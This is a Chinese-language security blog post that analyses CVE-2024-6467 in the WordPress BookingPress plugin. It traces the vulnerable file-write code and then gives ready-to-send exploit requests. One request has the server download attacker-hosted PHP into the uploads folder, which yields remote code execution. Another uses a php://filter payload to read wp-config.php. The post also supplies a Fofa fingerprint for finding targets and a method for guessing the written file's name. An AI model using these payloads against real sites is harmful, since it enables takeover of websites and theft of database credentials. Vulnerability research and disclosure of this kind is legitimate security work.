#  WordPress BookingPress 插件存在远程文件写入漏洞0day分析(RCE)   
原创 Mstir  星悦安全   2024-10-19 10:51  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字关注我们 并设为  
星标  
## 0x00 前言  
  
**CVE-2024-6467 影响版本:****<= 1.1.5**  
  
**BookingPress 是一个成熟的预约插件，可让您在 WordPress 网站上根据您的要求轻松设置完整的预订系统。**  
  
**任何想要在线管理约会安排的人都可以使用此插件。无论是小型/大型企业还是个人**  
  
**BOOKINGPRESS 功能:**  
- **健康与健康（水疗预约、按摩工作室、****健康中心****、浴室、芳香疗法、治疗师预约、生活教练预约、个人教练、任何其他需要预约的专家）**  
  
- ******沙龙与生活方式****（理发店、发廊、美容中心、美甲工作室、日光浴工作室、美容院工作室预订、理发师预订、美甲师）**  
  
- ******健身和健身房****（健身房和瑜伽教练，私人教练，瑜伽工作室，****瑜伽课程****，尊巴舞学院，个人私人教练，舞蹈教练，高尔夫预订）**  
  
- ******医疗和诊所****（医生预约，诊所，医疗中心，牙医，诊所预订系统，以及与医疗和诊所业务相关的其他领域。）**  
  
- **专业服务****（顾问、房地产经纪人、律师、摄影师、经销商、婚礼策划师、杂工服务、水管工服务、纹身店、承包商、游泳池预订服务）**  
  
- **教育（家教、教育中心、教练中心、私人专业人士、语言学校、语言课程预约、预订、私人家教、驾校预约、研讨会、网络研讨会预订）**  
  
****  
**F****ofa指纹:"BookingPress"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYezepH9yl2mWYoibMtqds2qVDTmL15H7RV3aLgshibLWQibKoLChv9txzXaA/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYezIeF6qia6arUCmc3sjkOk9vLsszMwGRSOVOoO07ZCaa7Qq9mmxCwu2XQ/640?wx_fmt=png&from=appmsg "")  
## 0x01 漏洞分析  
##   
  
**我们先关注一下位于 /wp-content/plugins/bookingpress-appointment-booking/core/classes/class.bookingpress.php 控制器的 bookingpress_save_lite_wizard_settings_func 方法存在 bookingpress_file_upload_function 函数上传文件，不过我们需要经过一些判断才能进入该函数.**  
```
/**
* Save lite wizard details
*
* @return void
*/
function bookingpress_save_lite_wizard_settings_func(){
  global $wpdb, $BookingPress, $tbl_bookingpress_default_workhours, $tbl_bookingpress_services, $tbl_bookingpress_customize_settings;

  $response              = array();
  $wpnonce               = isset($_REQUEST['_wpnonce']) ? sanitize_text_field($_REQUEST['_wpnonce']) : '';
  $bpa_verify_nonce_flag = wp_verify_nonce($wpnonce, 'bpa_wp_nonce');
  if (! $bpa_verify_nonce_flag ) {
    $response['variant']        = 'error';
    $response['title']          = esc_html__('Error', 'bookingpress-appointment-booking');
    $response['msg']            = esc_html__('Sorry, Your request can not be processed due to security reason.', 'bookingpress-appointment-booking');
    echo wp_json_encode($response);
    exit;
  }

  $bookingpress_wizard_data = !empty($_POST['wizard_data']) ? array_map(array( $BookingPress, 'appointment_sanatize_field' ), $_POST['wizard_data']) : array(); // phpcs:ignore WordPress.Security.ValidatedSanitizedInput.InputNotSanitized

  if(!empty($bookingpress_wizard_data)){
    $bookingpress_company_fields_data = !empty($bookingpress_wizard_data['company_fields_data']) ? $bookingpress_wizard_data['company_fields_data'] : array();
    $bookingpress_booking_options = !empty($bookingpress_wizard_data['booking_options']) ? $bookingpress_wizard_data['booking_options'] : array();
    $bookingpress_service_options = !empty($bookingpress_wizard_data['service_options']) ? $bookingpress_wizard_data['service_options'] : array();
    $bookingpress_styling_options = !empty($bookingpress_wizard_data['styling_options']) ? $bookingpress_wizard_data['styling_options'] : array();

    if(!empty($bookingpress_company_fields_data)){
      $bookingpress_logo = $bookingpress_company_fields_data['logo_img'];

      $bookingpress_logo_url = $bookingpress_company_fields_data['logo'];

      if( !empty($bookingpress_company_fields_data['logo_img']) && !empty($bookingpress_company_fields_data['logo_img']) ){

        $bookingpress_upload_image_name = $bookingpress_logo;

        $upload_dir                 = BOOKINGPRESS_UPLOAD_DIR . '/';
        $bookingpress_new_file_name = current_time('timestamp') . '_' . $bookingpress_upload_image_name;
        $upload_path                = $upload_dir . $bookingpress_new_file_name;
        $bookingpress_upload_res    = $BookingPress->bookingpress_file_upload_function($bookingpress_logo_url, $upload_path);

        $bookingpress_file_name_arr = explode('/', $bookingpress_logo_url);
        $bookingpress_file_name     = $bookingpress_file_name_arr[ count($bookingpress_file_name_arr) - 1 ];
        if( file_exists( BOOKINGPRESS_TMP_IMAGES_DIR . '/' . $bookingpress_file_name ) ){
          @unlink(BOOKINGPRESS_TMP_IMAGES_DIR . '/' . $bookingpress_file_name);
        }

        $bookingpress_logo_url = BOOKINGPRESS_UPLOAD_URL . '/' . $bookingpress_new_file_name;
      }

    ......
      
    $response['variant']        = 'success';
    $response['title']          = esc_html__('Success', 'bookingpress-appointment-booking');
    $response['msg']            = esc_html__('Data saved successfully', 'bookingpress-appointment-booking');
  }

  echo wp_json_encode($response);
  exit;
}
```  
  
**它首先通过$_REUESTS 函数获取 _wpnonce 变量，然后通过 wp_verify_nonce 原生函数进行验证bpa_wp_nonce，查看是否有权限可使用这个方法. 而在首页我们是看不到 bpa_wp_nonce ，所以我们利用VsCode全局搜索一下 bpa_wp_nonce.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYezicQ1McnzyiaBFOMapCokFLjkOWYqQrtVReMwtUssV9MO2IOWbRh9Joyw/640?wx_fmt=png&from=appmsg "")  
  
**最终在 /wp-content/plugins/bookingpress-appointment-booking/core/classes/frontend/class.bookingpress_spam_protection.php 控制器中找到了创建该鉴权的函数，并且无鉴权也可获取到 bpa_wp_nonce**  
```
/**
* Add Spam Validation Captcha to Session
*
* @return void
*/
function bookingpress_generate_spam_captcha_func()
{
    global $wpdb;
    $response              = array();
    $wpnonce               = isset($_REQUEST['_wpnonce']) ? sanitize_text_field($_REQUEST['_wpnonce']) : '';
    $bpa_verify_nonce_flag = wp_verify_nonce($wpnonce, 'bpa_wp_nonce');
    $response['updated_nonce'] = '';
    if (! $bpa_verify_nonce_flag ) {

      $response['variant'] = 'error';
      $response['title']   = esc_html__('Error', 'bookingpress-appointment-booking');
      $response['msg']     = esc_html__('Sorry, Your request can not process due to security reason.', 'bookingpress-appointment-booking');
      $response['updated_nonce'] = esc_html(wp_create_nonce('bpa_wp_nonce'));
      wp_send_json($response);
      die();
    }

    $bookingpress_spam_captcha    = $this->bookingpress_generate_captcha_code(12);
    $_SESSION['bpa_filter_input'] = md5($bookingpress_spam_captcha);

    $response['variant']     = 'success';
    $response['title']       = esc_html__('Success', 'bookingpress-appointment-booking');
    $response['msg']         = esc_html__('Captcha generated successfully.', 'bookingpress-appointment-booking');
    $response['captcha_val'] = $bookingpress_spam_captcha;
    wp_send_json($response);
    die();
  }
```  
  
**而他在 add_action中注册为不需要鉴权的Ajax**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYezQ8XPSy3TOAQNoZ1wzFfNy2gCvQ5r2giceKeQ0nZj5uicib5cGwcNORiaxg/640?wx_fmt=png&from=appmsg "")  
  
**所以通过GET 访问 /wp-admin/admin-ajax.php?action=bookingpress_generate_spam_captcha 即可直接获取到 bpa_wp_nonce**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYezfzSicBCxw9dP8YiaVMYjy1uiapicuLOugc3KiboYicV86wnltrlGVQJFq6vg/640?wx_fmt=png&from=appmsg "")  
  
**OK 有了 bpa_wp_nonce 我们就可以直接继续走它的三个 if 判断 主要就是通过$_POST 获取 wizard_data 参数并将其数组化，不为空即可进入下面操作**  
```
$bookingpress_wizard_data = !empty($_POST['wizard_data']) ? array_map(array( $BookingPress, 'appointment_sanatize_field' ), $_POST['wizard_data']) : array();
```  
  
**只需要传入 wizard_data[company_fields_data][logo_img] 和 wizard_data[company_fields_data][logo] 这两个变量即可进入 bookingpress_file_upload_function 函数:**  
```
/**
* BookingPress custom function for file upload
*
* @param  mixed $source
* @param  mixed $destination
* @return void
*/
function bookingpress_file_upload_function( $source, $destination )
{

    $allow_file_upload = 1;
    $allow_file_upload = apply_filters('bookingpress_allow_file_uploads', $allow_file_upload);
    if (empty($source) || empty($destination) || empty($allow_file_upload)) {
      return false;
    }

    if (! function_exists('WP_Filesystem') ) {
      include_once ABSPATH . 'wp-admin/includes/file.php';
    }

    WP_Filesystem();
    global $wp_filesystem;

    $file_content = $wp_filesystem->get_contents($source);

    $result = $wp_filesystem->put_contents($destination, $file_content, 0777);

    return $result;
  }
```  
  
**这里通过 $wp_filesystem->get_contents() 函数来获取到远程文件的内容，然后再通过 $wp_filesystem->put_contents() 函数来写入到指定的路径当中. 文件名为 上传时间戳+"_"+ logo_img变量. 且抽象的是此处还支持PHP 伪协议，就是能随便读取服务器上的任意文件.**  
  
**写入路径 : /wp-content/uploads/bookingpress/时间戳_aaa.php**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYezgk6GMJSWdtXlpyudYGQhW0onzeRMyiaJkp4PCYYGfJYnFGjqicASrYEw/640?wx_fmt=png&from=appmsg "")  
  
**get_contents() 函数和 put_contents() 函数我们就不追踪了，这是 WP_Filesystem 系统中比较常见的两个文件操纵函数.**  
  
**完整利用链:**  
  
****## 0x02 漏洞复现  
##   
  
**该漏洞的利用需要具有订阅者权限，也就是需要注册并登录WordPress才能使用该漏洞. 访问 /wp-login.php?action=register 即可进行注册(非默认开启注册)**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYezJ1Ye5zH71BowZ25Z8ZtgicQIvAQjqKsjmmrqIVNsFAIpzs3SBAKfYAA/640?wx_fmt=png&from=appmsg "")  
  
**然后访问一下 /wp-admin/admin-ajax.php?action=bookingpress_generate_spam_captcha 获取到bqa_wp_nonce**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYez9tNysVrNV8REoWTLcx8PhZk5mzoBibPxzTQxHVlJTwogicsqSguloq0A/640?wx_fmt=png&from=appmsg "")  
  
**之后准备一个文件 111.txt 内容为 <?php phpinfo();?> 然后放在云服务器或者VPS上，之后使用Payload即可写入文件:**  
```
POST /wp-admin/admin-ajax.php?action=bookingpress_save_lite_wizard_settings HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 193
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_5c016e8f0f95f039102cbe8366c5c7f3=mstir%7C1729421530%7CZLCGG775Ujn2fNKdlT7bmA8NdYmBpddc0jDOmnLZvxu%7Cdca4fde6daf6c85dcfc3e29c1dbf284d735b26fb9d0255f5c76cc5ea15e41496; wp_lang=zh_CN; wordpress_test_cookie=WP%20Cookie%20check; PHPSESSID=jp5re76tlu2agddmtjhqnh5kib; wordpress_logged_in_5c016e8f0f95f039102cbe8366c5c7f3=mstir%7C1729421530%7CZLCGG775Ujn2fNKdlT7bmA8NdYmBpddc0jDOmnLZvxu%7C3c94c9917c78541d9802319afb09e3fc20935542fcd237801f5328eab72f603d; wp-settings-2=mfold%3Do; wp-settings-time-2=1729248730
Host: 127.0.0.1
Origin: http://127.0.0.1
Pragma: no-cache
Referer: http://127.0.0.1/wp-admin/admin-ajax.php?action=bookingpress_save_lite_wizard_settings
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

_wpnonce=你的bqa_wp_nonce&wizard_data[company_fields_data][logo_img]=aaa.php&wizard_data[company_fields_data][logo]=http://website/111.txt
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYezKH3Nef69npnbLjiazfECGlqM9LBOHkyIKzWUPmAjgVWUxXLfoXD7Wdw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYezaD8vZ1TgamUibR6CuCkDtjnAepQPh890ibZ8EysZ8HspDJPicpT1c5v5g/640?wx_fmt=png&from=appmsg "")  
**但是我实际时间是19:34:18 这里要注意 分秒以服务器Date为准，小时以北京时间为准+8小时**  
  
**PS:注意这里因为时区问题，使用了GMT偏移量，所以我们需要以我们上传时间为准+8小时再转换时间戳.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYez5vumriczLrSMHm38ldcCaL5u3ibkzFWqrUAR2FNV7jWkgibL3Nq3e15pw/640?wx_fmt=png&from=appmsg "")  
  
**根据命名规则直接访问 /wp-content/uploads/bookingpress/1729250804_aaa.php 即可看到写入的PHP文件**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYezHunMVAAL2I1L1SYmRbVQok2IRdDMLHaCiahjUibCBIF9oBKFEGUl5BnA/640?wx_fmt=png&from=appmsg "")  
  
**=========================================**  
  
**0x01中说了，这个点还能读取服务器上的任意文件，所以我们利用php伪协议即可读取到任意文件，当然，其他协议也都支持的，Payload:**  
```
POST /wp-admin/admin-ajax.php?action=bookingpress_save_lite_wizard_settings HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wordpress_5c016e8f0f95f039102cbe8366c5c7f3=mstir%7C1729423444%7CkqwlXfoYbZLlK22F6HqgFqXz71Qp8BqJV7um5LjEflh%7Cf31bf462a5d2812adb8f06a27571e581a03fd6d8ea1a441996e2c08f7d61f21c; wp-settings-1=libraryContent%3Dbrowse%26editor%3Dhtml%26mfold%3Do; wp-settings-time-1=1729149467; wp-settings-2=mfold%3Do; wp-settings-time-2=1729169310; PHPSESSID=pmjrbj0t3jsc33felruuhn28ju; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_5c016e8f0f95f039102cbe8366c5c7f3=mstir%7C1729423444%7CkqwlXfoYbZLlK22F6HqgFqXz71Qp8BqJV7um5LjEflh%7Ca31ed3feb8769a91bbc089add323e1784bf837251197b7c1a97d467091bff4f2
Connection: close
Content-Length: 161

_wpnonce=36db33f761&wizard_data[company_fields_data][logo_img]=aaa.php&wizard_data[company_fields_data][logo]=php://filter/read=convert.base64-encode/resource=../wp-config.php
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYezA1Da3AVkyicCmaYlNfCZW5RsFl8eSsddDXtFkGxwPPFWv0xNUwiaLLNA/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYezNTyCAaS9LFTiaASpoLxdSlEHiaRzmyoBrlzzXXsOhG8ibu1XNfqUo4Xsg/640?wx_fmt=png&from=appmsg "")  
  
**访问 /wp-content/uploads/bookingpress/1729280966_aaa.php 并解码base64.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dM3eA4vuhS5c0icYAB5GYez24dPTuySV3Cib9RtO7umWxD24ughOGKbhjzfbBGLZAPgfRcSjC1Aw3A/640?wx_fmt=png&from=appmsg "")  
## 0x03 插件下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**BookingPress 源码关注公众号发送 241019 获取!**  
  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
